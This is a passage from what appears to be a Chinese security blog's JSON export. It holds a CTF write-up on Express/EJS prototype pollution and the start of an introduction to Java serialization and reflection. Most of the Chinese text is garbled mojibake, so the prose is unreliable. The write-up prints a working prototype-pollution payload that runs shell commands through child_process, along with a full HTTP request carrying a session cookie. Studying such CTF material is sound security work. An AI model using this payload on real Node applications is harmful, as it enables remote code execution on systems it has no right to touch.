res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\");  });\n\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨actionè·¯ç”±ä¸‹é€šè¿‡è¯·æ±‚ä½“æ¥è¿›è¡Œæ±¡æŸ“ åŸå‹é“¾æ±¡æŸ“çš„ä½ç½®æ‰¾åˆ°äº† æ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾åˆ°å¯ä»¥ç”¨æ¥æ§åˆ¶é”®åå’Œé”®å€¼çš„å¯¹è±¡\nçœ‹åˆ°è¿™æ®µ\nrouter.get('/info', function (req, res) {  res.render('index',data={'user':res.outputFunctionName});})\n\nrenderå‡½æ•°åº”è¯¥ä¸é™Œç”Ÿ åœ¨æ¨¡æ¿æ³¨å…¥æ”»å‡»ï¼ˆSSTIï¼‰ä¸­å¾ˆå¸¸è§  è¿™é‡Œå°†å›æ˜¾reqçš„outputFunctionNmaeæ¸²æŸ“åˆ°äº†indexä¸­ é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨outputFunctionNameè¿›è¡ŒSSTIä»è€Œè¾¾åˆ°rceå‘¢ ä»£ç è·Ÿä¸‹æ¥æˆ‘ä»¬å‘ç°å¹¶æ²¡æœ‰outputFunctionNameè¿™ä¸ªä¸œè¥¿ ä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨æ¥æ±¡æŸ“åŸå‹é“¾çš„è½½ä½“ å¦‚æœæŠŠObjectçš„prototypeä¸­åŠ ä¸Šé”®åä¸ºoutputFunctionName é”®å€¼ä¸ºæ¶æ„payloadçš„å±æ€§ é‚£ä¹ˆåœ¨è¿›è¡Œæ¨¡æ¿æ¸²æŸ“æ—¶ æ˜¯ä¸æ˜¯å°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„payload\nä½†æ˜¯æˆ‘ä»¬è€ƒè™‘ä¸€ä¸ªé—®é¢˜ å¦‚ä½•å»ä¿®æ”¹Objectçš„prototype ï¼ˆç¡®å®æ˜¯å¯ä»¥çš„ ä½†æ˜¯æœ‰ç‚¹éº»çƒ¦ ä¸‹é¢å‚è€ƒæ–‡ç« çš„æœ€åä¸€ç¯‡å°±æ˜¯ç›´æ¥ä¿®æ”¹Objectçš„prototyprï¼‰æˆ‘ä»¬é‡æ–°å›åˆ°è¿™æ®µä»£ç \nrouter.post('/action', function (req, res) {  if(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")}   req.session.user.data = clone(req.body);  res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\");  });\n\nå‘ç°è¯·æ±‚ä½“è¢«cloneåˆ°äº†req.session.user.dataä¸­ å¯¹äºreq.session.userè¿™ä¸ªå¯¹è±¡æ¥è¯´ å®ƒçš„__proto__å±æ€§æ˜¯ä¸æ˜¯å°±æ˜¯Objectçš„prototype æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹äº†è¿™ä¸ªå¯¹è±¡çš„__proto__ä»è€Œè¾¾åˆ°ç›®çš„\nreq.session.user={      'user':req.body.userid.toUpperCase(),      'passwd': req.body.pwd,      'isLogin':false    }\n\nSSTIçš„payloadæˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ åæ­£åŸç†éƒ½æ˜¯ä¸æ–­è°ƒç”¨åŸå‹å¯¹è±¡ æœ€åæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥ç”¨æ¥rceçš„å‡½æ•° payloadå’ŒCVE-2019-10744æ˜¯ä¸€æ ·çš„ ç›´æ¥æ¬æ¥ç”¨äº†\n{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//\"}}\n\næ±¡æŸ“æˆåŠŸååœ¨infoè·¯ç”±ä¸‹è°ƒç”¨res.outputFunctionNameæ—¶ å°±åƒä¸Šé¢è°ƒç”¨son.last_nameçš„è¿‡ç¨‹ä¸€æ · æœ€ç»ˆè°ƒç”¨åˆ°äº†Objectçš„outputFunctionName å¹¶ä¸”è¦è®©__proto__ä¸ºé”®å è¦ç”¨JSONæ ¼å¼ æ‰€ä»¥è¦ç”¨burpæ‹¦åŒ…æ·»åŠ content typeï¼ˆåœ¨è¿›è¡ŒPOSTä¼ å‚æ—¶å¿…é¡»æœ‰è¯¥å¤´ï¼‰ æ”¾ä¸ªåŒ…åšä¸ªå‚è€ƒ è®°å¾—è·¯ç”±å’Œä¼ å‚æ–¹å¼ä¹Ÿè¦æ”¹ å†ä¼ payload\nPOST /action HTTP/1.1Host: 8f9161b2-5acd-465d-8854-969004e758fb.node4.buuoj.cn:81Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://8f9161b2-5acd-465d-8854-969004e758fb.node4.buuoj.cn:81/loginAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: session=s%3A1jilnCKBesMA5qC1gPlt6SPb18ntn7h7.4wyQ3TbDJtVXUhdOdErxMFKs6EcCnNrCkeUjRFYK3MYContent-Type: application/jsonConnection: closeContent-Length: 137{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//\"}}\n\nåœ¨actionè·¯ç”±ä¸‹æ±¡æŸ“æˆåŠŸååº”è¯¥æ¥ç€è®¿é—®infoè·¯ç”±è¿›è¡ŒSSTI ä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æˆ‘åŒ…å‘è¿‡å»ç›´æ¥ç»™flagäº† \n\nå‚è€ƒæ–‡ç« æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡» | ç¦»åˆ«æ­Œ (leavesongs.com)\nã€å…¨ç½‘é¦–å‘:å·²å®Œç»“ã€‘å¿«é€Ÿææ‡‚ã€åŸå‹ã€åŸå‹é“¾ã€ã€JavaScriptåŸºç¡€ä¸“é¢˜ã€‘_å“”å“©å“”å“©_bilibili\n GYCTF2020]Ez_Express åŸå‹é“¾æ±¡æŸ“_-æ €è“-çš„åšå®¢-CSDNåšå®¢\nFuzzä¸­çš„javascriptå¤§å°å†™ç‰¹æ€§ | ç¦»åˆ«æ­Œ (leavesongs.com)\n Web/Nodejs]åŸå‹é“¾æ±¡æŸ“EJSæ¨¡å—çš„åˆ©ç”¨åˆ†æ(é™„æºç åˆ†æ)_è»ŠéˆŠçš„åšå®¢-CSDNåšå®¢\nhttps://xz.aliyun.com/t/6113#toc-4\n","categories":["WebSec"],"tags":["åŸå‹é“¾æ±¡æŸ“"]},{"title":"Javaå®‰å…¨ååºåˆ—åŒ–é¢„å¤‡å…¨çŸ¥","url":"/2023/04/21/Java%E5%AE%89%E5%85%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%84%E5%A4%87%E5%85%A8%E7%9F%A5/","content":"JavaåŸç”Ÿåºåˆ—åŒ–/ååºåˆ—åŒ–Javaååºåˆ—åŒ–å…¥é—¨ç¯‡Java IOåœ¨å­¦ä¹ Javaååºåˆ—åŒ–ä¹‹å‰æˆ‘ä»¬å…ˆè¦äº†è§£ä¸€ä¸‹Javaçš„è¾“å…¥è¾“å‡ºæµï¼š\njavaçš„IOæµåˆ†ä¸ºäº†æ–‡ä»¶IOæµï¼ˆFileInput/OutputStreamï¼‰å’Œå¯¹è±¡IOæµï¼ˆObjectInput/OutputStreamï¼‰ï¼Œä»åå­—ä¸Šå°±å¯ä»¥çœ‹å‡ºæ¥ä¸€ä¸ªæ˜¯ç”¨æ¥å¯¹æ–‡ä»¶è¿›è¡Œè¾“å…¥å’Œè¾“å‡ºï¼Œä¸€ä¸ªæ˜¯å¯¹å¯¹è±¡è¿›è¡Œè¾“å…¥å’Œè¾“å‡ºã€‚\næµçš„ä¼ è¾“è¿‡ç¨‹ï¼š\né¦–å…ˆä¸ç®¡æ˜¯è¾“å…¥è¿˜æ˜¯è¾“å‡ºï¼Œä¼ è¾“çš„ä¸¤ç«¯éƒ½æ˜¯æ–‡ä»¶å’Œjavaçš„è¿è¡Œç¨‹åºï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦åœ¨è¿™äºŒè€…ä¹‹é—´è¿›è¡Œä¼ è¾“ï¼Œæˆ‘ä»¬å°±éœ€è¦å°†ä»–ä»¬ä¸¤ä¸ªä¹‹é—´æ­èµ·æ¥ä¸€ä¸ªå¯ä»¥ä¼ è¾“çš„é€šé“ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æµçš„ä¼ è¾“ã€‚\n\nè¾“å‡ºæµï¼ˆOutputStreamï¼‰ï¼š\n\nå¦‚æœæˆ‘ä»¬æƒ³å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå†™å…¥æ“ä½œï¼Œé‚£ä¹ˆå®è´¨ä¸Šæ˜¯åœ¨javaç¨‹åºä¸­å°†æµï¼ˆæƒ³è¦å†™å…¥çš„å†…å®¹ï¼‰è¾“å‡ºåˆ°ç›®çš„æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æµçš„æ–¹å‘æ˜¯ä»javaè¾“å‡ºåˆ°æ–‡ä»¶ï¼Œä¸¾ä¸ªå¯¹æ–‡ä»¶å†™å…¥ä¸€ä¸ªå¯¹è±¡çš„ä¾‹å­ï¼š\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"filename\"));oos.writeObject(obj);\n\né¦–å…ˆç”¨new FileOutputStreamåˆ›å»ºä¸€ä¸ªæ–‡ä»¶è¾“å‡ºæµï¼Œå†ç”¨new ObjectOutputStreamåˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å‡ºæµï¼ˆå› ä¸ºoosæ˜¯å¯¹è±¡è¾“å‡ºæµç±»å‹ï¼‰ï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥åœ¨javaç¨‹åºä¸­å‘å¤–ï¼ˆæ–‡ä»¶ï¼‰è¾“å‡ºæµï¼ˆå†…å®¹ï¼‰äº†ï¼Œç”»æˆå›¾å¤§æ¦‚æ˜¯è¿™æ ·ï¼š\n\nå½“æˆ‘ä»¬è¦ç»™è¿™ä¸ªæ–‡ä»¶ä¼ ä¸€ä¸ªobjå¯¹è±¡æ—¶ï¼Œå°±ä¼šä»javaç¨‹åºé¡ºç€è¿™æ¡é€šé“è¿›å…¥åˆ°fileä¸­ã€‚\n\nè¾“å…¥æµï¼ˆInputStreamï¼‰\n\nå…¶å®è¾“å…¥æµå’Œè¾“å‡ºæµæ„å»ºå‡ºä¼ è¾“é€šé“çš„æ–¹æ³•å‡ ä¹æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«å°±æ˜¯æµçš„è¾“å‡ºæ–¹å‘æ˜¯ä»fileæŒ‡å‘äº†javaç¨‹åºï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦readè¿™ä¸ªæ–‡ä»¶æˆ‘ä»¬å°±è¦ç”¨è¾“å…¥æµå°†fileè¾“å…¥åˆ°javaç¨‹åºä¸­è¿›è¡Œè¯»å–ã€‚\nJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹é¦–å…ˆä¸ºä»€ä¹ˆè¦è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œåœ¨ç¨‹åºè¿è¡Œç»“æŸåï¼Œè¿™ä¸ªç¨‹åºé‡Œçš„å¯¹è±¡éƒ½ä¼šè¢«åˆ é™¤ï¼Œå¹¶ä¸”å¯¹è±¡çš„æ„æˆå¾ˆå¤æ‚ï¼Œä¼ è¾“èµ·æ¥éå¸¸ä¸æ–¹ä¾¿ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦è®©æŸäº›å¯¹è±¡æŒä¹…çš„ä¿å­˜ä¸‹æ¥å¹¶åˆ©äºä¼ è¾“ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¿™äº›å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æˆä¸€ä¸²æ•°æ®ï¼Œä¿å­˜åœ¨æŸä¸ªåœ°æ–¹ï¼Œåœ¨éœ€è¦ç”¨åˆ°è¿™ä¸ªå¯¹è±¡æ—¶å†ååºåˆ—åŒ–è®©è¿™ä¸€ä¸²æ•°æ®è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡ã€‚çœ‹åˆ°ä¸€ä¸ªå¾ˆç”ŸåŠ¨çš„æ¯”å–»ï¼Œæƒ³æŠŠä¸€å¼ æ¡Œå­æ¬è¿›é—¨é‡Œï¼Œå¦‚æœä¸èƒ½é€šè¿‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¿™ä¸ªæ¡Œå­æ‹†å¼€ï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œåœ¨æ¬è¿›å»ä¹‹åå†å°†æ¡Œå­ç»„è£…å›å»ï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œè¿™å°±æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\nä¸phpååºåˆ—åŒ–ä¸åŒçš„æ˜¯phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–æä¾›äº†å…³é”®å­—serializeå’Œunserializeï¼Œä½†javaå¹¶æ²¡æœ‰è¿™ç§apiï¼Œæˆ‘ä»¬åˆšæ‰æåˆ°äº†Javaçš„IOï¼Œé‚£ä¹ˆå®ƒå’ŒJavaçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¹‹é—´æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œæˆ‘ä»¬åˆšæ‰è¯´åºåˆ—åŒ–å°±æ˜¯å°†å¯¹è±¡è½¬æ¢ä¸ºä¸€ä¸²å­—èŠ‚æ•°æ®å¹¶ä¿å­˜èµ·æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹çš„å®ç°å…¶å®å°±æ˜¯ä¾é javaçš„è¾“å‡ºï¼Œå°†è¿™ä¸ªå¯¹è±¡ä»javaç¨‹åºé‡Œä»¥å­—èŠ‚æ•°æ®æµçš„å½¢å¼è¾“å‡ºåˆ°javaçš„å¤–éƒ¨ï¼Œç›¸å¯¹çš„ååºåˆ—åŒ–å…¶å®å°±æ˜¯ä¾é javaçš„è¾“å…¥ï¼Œå°†javaå¤–çš„å­—èŠ‚æ•°æ®æµè¾“å…¥åˆ°javaç¨‹åºä¸­ï¼Œæœ€ç»ˆç»è¿‡ä¸€äº›å¤„ç†è¿˜åŸä¸ºå¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´javaä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯éœ€è¦å¼€å‘äººå‘˜è‡ªå·±å†™å‡ºæ•´ä¸ªè¿‡ç¨‹ã€‚è¿™é‡Œæä¾›ä¸¤æ®µä½¿ç”¨javaIOè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ä»£ç ï¼ˆå¦‚æœè¦å®Œæˆæ•´ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œè¿˜éœ€è¦å…¶ä»–æ–¹æ³•å‚ä¸æ„å»ºï¼Œå¦‚readObjectå’ŒwriteObjectï¼Œä¸‹é¢ä¼šæåˆ°ï¼‰ï¼Œå‡è®¾ser.binæ˜¯æˆ‘ä»¬ç”¨æ¥å‚¨å­˜åºåˆ—åŒ–åå­—èŠ‚æ•°æ®æµçš„æ–‡ä»¶ï¼š\n/** è¦åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç±» **/import java.io.Serializable;public class Person implements Serializable {    private String name;    private int age;    public Person(){    }    // æ„é€ å‡½æ•°    public Person(String name, int age){        this.name = name;        this.age = age;    }    @Override    public String toString(){        return \"Person{\" +                \"name='\" + name + '\\\\'' +                \", age=\" + age +                '}';    }}\n\n/** åºåˆ—åŒ– **/import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutput;import java.io.ObjectOutputStream;public class SerializationTest {    public static void serialize(Object obj) throws IOException{        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));        oos.writeObject(obj);    }    public static void main(String[] args) throws Exception{        Person person = new Person(\"aa\",22);        System.out.println(person);        serialize(person);    }}\n\n/** ååºåˆ—åŒ– **/import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class UnserializeTest {    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    }    public static void main(String[] args) throws Exception{        Person person = (Person)unserialize(\"ser.bin\");        System.out.println(person);    }}\n\nè¾“å‡ºåå¯ä»¥å‘ç°åœ¨åºåˆ—åŒ–ä¹‹å‰è¾“å‡ºå¯¹è±¡personå’Œåœ¨ååºåˆ—åŒ–åè¾“å‡ºéƒ½è°ƒç”¨äº†__toStringï¼ŒæˆåŠŸæ„é€ äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\nphpå’ŒJavaååºåˆ—åŒ–ä¹‹é—´çš„åŒºåˆ«åœ¨phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸­æä¾›äº†serializeå’Œunserializeå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºä¸€ä¸²æ•°æ®æˆ–ç›´æ¥å°†ä¸€ä¸²æ•°æ®ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œç¨‹åºå‘˜åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ˜¯æ— æ³•å‚ä¸çš„ï¼Œä½†åœ¨Javaä¸­ï¼Œéœ€è¦ç¨‹åºå‘˜è‡ªå·±æ¥æ„å»ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œphpåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è§¦å‘__wakeupå‡½æ•°ï¼Œjavaåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è§¦å‘readObjectæ–¹æ³•ï¼Œè™½ç„¶éƒ½æ˜¯åœ¨ååºåˆ—åŒ–æ—¶è§¦å‘ï¼Œä½†äºŒè€…ä¹‹é—´æœ‰ä¸€äº›ç»†å¾®çš„å·®åˆ«ã€‚\nphpååºåˆ—åŒ–ï¼ˆå¯¹ä¸€ä¸ªæ•°æ®åº“é“¾æ¥å¯¹è±¡ååºåˆ—åŒ–ï¼‰ï¼š\n&lt;?phpclass Connection{    protected $link;    private $dsn, $username, $password;    public function __construct($dsn, $username, $password)    {        $this-&gt;dsn = dsn;        $this-&gt;username = username;        $this-&gt;password = password;        $this-&gt;connect();    }    private function connect()    {        $this-&gt;link = new PDO($this-&gt;dsn, $this-&gt;username, $this-&gt;password);    }}\n\nå¦‚æœæˆ‘ä»¬ç›´æ¥è¾“å‡ºåºåˆ—åŒ–åçš„è¿™ä¸ªConnectionç±»çš„å¯¹è±¡ï¼Œå‘ç°è¾“å‡ºä¸ºnullï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿæ˜¯nullï¼Œå› ä¸ºåœ¨phpä¸­èµ„æºç±»å‹çš„å¯¹è±¡é»˜è®¤ä¸ä¼šå†™å…¥åºåˆ—åŒ–æ•°æ®ä¸­ã€‚\nå¦‚æœæˆ‘ä»¬å°†ä»£ç æ”¹æˆä¸‹é¢è¿™æ ·å°±å¯ä»¥åœ¨åºåˆ—åŒ–ååœ¨$linkä¸­æ‹¿åˆ°ä¸€ä¸ªæ•°æ®åº“è¿æ¥äº†ï¼š\n&lt;?phpclass Connection{    protected $link;    private $dsn, $username, $password;    public function __construct($dsn, $username, $password)    {        $this-&gt;dsn = dsn;        $this-&gt;username = username;        $this-&gt;password = password;        $this-&gt;connect();    }    private function connect()    {        $this-&gt;link = new PDO($this-&gt;dsn, $this-&gt;username, $this-&gt;password);    }    public function __sleep()    {            return array('dsn', 'username', 'password');    }    public function __wakeup()    {        $this-&gt;connect();    }}\n\nConnectionçš„å¯¹è±¡è¢«ååºåˆ—åŒ–åè°ƒç”¨__wakeupï¼Œæ‰§è¡Œconnectå‡½æ•°è¿æ¥æ•°æ®åº“ï¼Œæ‰€ä»¥__wakeupçš„ä½œç”¨å…¶å®æ˜¯ååºåˆ—åŒ–åæ‰§è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œä½†åœ¨phpä¸­å¾ˆå°‘åˆ©ç”¨åºåˆ—åŒ–æ•°æ®ä¼ è¾“èµ„æºç±»å‹çš„å¯¹è±¡ï¼Œè€Œå…¶ä»–ç±»å‹çš„å¯¹è±¡åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å·²ç»æŠŠå€¼å†™æ­»äº†ï¼Œæ‰€ä»¥phpçš„ååºåˆ—åŒ–æ¼æ´ä¸­å¾ˆå°‘æ˜¯ç”±__wakeupè¿™ä¸ªæ–¹æ³•è§¦å‘çš„ï¼Œé€šå¸¸è§¦å‘åœ¨__destructä¸­ã€‚\nJavaååºåˆ—åŒ–ï¼š\nimport java.io.IOException;import java.io.Serializable;public class Person implements Serializable {    private String name;    private int age;    Person(String name,int age)    {        this.name = name;        this.age = age;    }    private void writeObject(java.io.ObjectOutputStream s) throws IOException {        s.defaultWriteObject();        s.writeObject(\"This is a Object\");    }    private void writeObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {        s.defaultReadObject();        String message = (String) s.readObject();        System.out.println(message);    }}\n\nåœ¨writeObjectä¸­ï¼Œå½“ä¼ å…¥çš„å¯¹è±¡å®Œæˆäº†ä»ObjectOutputStreamä¸­ç»§æ‰¿æ¥çš„defaultWriteObjectåï¼Œå‘æµå†…å†™å…¥äº†ä¸€ä¸ªâ€This is a Objectâ€ï¼Œå› æ­¤ä¼šåœ¨åºåˆ—åŒ–åè§¦å‘æ”¹æ–¹æ³•ï¼Œå°†å­—ç¬¦ä¸²å†™å…¥è¾“å‡ºæµçš„å¯¹è±¡ä¸­ï¼Œç”¨çŸ¥è¯†æ˜Ÿçƒé‡Œæåˆ°çš„å·¥å…·SerializationDumperå¯ä»¥çœ‹åˆ°è¿™ä¸ªå­—ç¬¦ä¸²è¢«å†™åˆ°äº†objectAnnotationä½ç½®ï¼Œåœ¨ååºåˆ—åŒ–è¿˜åŸå¯¹è±¡æ—¶å°±ä¼šå°†è¿™ä¸ªå­—ç¬¦ä¸²è¾“å‡ºã€‚\n\nååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯æ ¹æ®å¼€å‘è€…çš„æƒ³æ³•æ¥å®ç°çš„ï¼Œæ‰€ä»¥æ€»ç»“ä¸€ä¸‹__wakeupå’ŒreadObjectçš„ä¸åŒå°±æ˜¯ï¼šreadObjectå€¾å‘äºè§£å†³â€ååºåˆ—åŒ–æ—¶å¦‚ä½•è¿˜åŸä¸€ä¸ªå®Œæ•´å¯¹è±¡â€è¿™ä¸ªé—®é¢˜ï¼Œè€ŒPHPçš„__wakeupæ›´å€¾å‘äºè§£å†³ååºåˆ—åŒ–åå¦‚ä½•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡çš„é—®é¢˜ã€‚\nåå°„+URLDNSJavaåå°„ç¯‡å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹åŒ–è¯¥ç±»çš„å¯¹è±¡å¹¶è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œæˆ–è€…æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨è¯¥ç±»ä¸­çš„é™æ€æ–¹æ³•ï¼Œè¿™æ˜¯æˆ‘ä»¬åœ¨ä¸€èˆ¬æƒ…å†µä¸‹è°ƒç”¨ä¸€ä¸ªæ–¹æ³•æ—¶çš„è¿‡ç¨‹ï¼Œä½†æ˜¯åœ¨ä¸åŒçš„è¯­è¨€ä¸­ä¹Ÿæœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥æ‹¿åˆ°æŸä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œåœ¨javaä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡â€œåå°„â€æ¥æ‹¿åˆ°æŸä¸€ä¸ªç±»ä¸­çš„å…·ä½“å†…å®¹ å¦‚æœæŠŠé€šè¿‡newå¯¹è±¡å¹¶ä¸”è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•çš„è¿‡ç¨‹å«åšâ€œæ­£å°„â€ï¼Œé‚£ä¹ˆä¸ä½¿ç”¨newæ¥åˆ›å»ºå¯¹è±¡å¹¶è°ƒç”¨å…¶ä¸­æ–¹æ³•çš„è¿‡ç¨‹å°±å«åšâ€œåå°„â€\nåå°„å¸¸ç”¨åˆ°çš„æ–¹æ³•åœ¨javaçš„langåŒ…ä¸­æœ‰ä¸€ä¸ªé™æ€Classç±» åœ¨javaç¨‹åºè¿è¡Œå¹¶ç¼–è¯‘åŠ è½½ä¸€ä¸ªç±»æ—¶ï¼Œjava.lang.Classå°±ä¼šå®ä¾‹åŒ–å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å‚¨å­˜è¯¥ç±»çš„æ‰€æœ‰ä¿¡æ¯ å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹æ³•æ¥è·å–åˆ°è¿™ä¸ªç±»çš„ä¿¡æ¯ å…ˆäº†è§£ä¸€äº›æ–¹æ³•\n\nClass.forName(classname) è·å–classnameç±»ä¸­çš„æ‰€æœ‰å±æ€§åŒ…æ‹¬ç±»å æ¯”å¦‚Class clazz = Class.forName(\"java.lang.Runtime\");\n\né‚£ä¹ˆç±»clazzä¸­å°±å¾—åˆ°äº†java.lang.Runtimeä¸­çš„æ‰€æœ‰å±æ€§\n\nClass.newInstance()å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶è§¦å‘è¯¥ç±»çš„æ„é€ æ–¹æ³• ä¸‹é¢ä¼šè¯¦ç»†è§£é‡Š\nClass.getMethod(method name,arg) è·å–ä¸€ä¸ªå¯¹è±¡ä¸­çš„publicæ–¹æ³•ï¼Œç”±äºjavaæ”¯æŒæ–¹æ³•çš„é‡è½½ï¼Œæ‰€ä»¥éœ€è¦ç¬¬äºŒå‚æ•°ä½œä¸ºè·å–çš„æ–¹æ³•çš„å½¢å‚åˆ—è¡¨ï¼Œè¿™æ ·å°±å¯ä»¥ç¡®å®šè·å–çš„æ˜¯å“ªä¸€ä¸ªæ–¹æ³•\nMethod.invoke() æ‰§è¡Œæ–¹æ³•ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œåˆ™invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¯¥æ–¹æ³•æ‰€åœ¨çš„å¯¹è±¡ï¼Œå¦‚æœæ˜¯é™æ€æ–¹æ³•åˆ™ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯nullæˆ–è€…è¯¥æ–¹æ³•æ‰€åœ¨çš„ç±» ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦æ‰§è¡Œæ–¹æ³•çš„å‚æ•°\n\nforNameå¹¶ä¸æ˜¯å”¯ä¸€è·å–ä¸€ä¸ªç±»çš„æ–¹å¼ï¼Œå…¶ä»–æ–¹å¼è¿˜æœ‰ï¼š\n\nobj.getClass() å¦‚æœä¸Šä¸‹æ–‡ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹objï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡obj.getClassæ¥è·å–å®ƒçš„ç±»\nY1.class å¦‚æœå·²ç»åŠ è½½äº†ä¸€ä¸ªç±»Y1ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒç”±java.lang.classæ‰€åˆ›é€ çš„å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥ä½¿ç”¨è¿™ç§æ–¹æ³•è·å–å³å¯ï¼Œè¿™ç§æ–¹æ³•å¹¶ä¸å±äºåå°„\nClass.Forname å¦‚æœçŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿ç”¨forNameæ¥è·å–\n\nå…³äºfornameé»˜è®¤æƒ…å†µä¸‹ forNameçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»åï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯ClassLoader\nClassLoaderæ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ï¼Œjavaé»˜è®¤çš„ClassLoaderå°±æ˜¯æ ¹æ®ç±»ååŠ 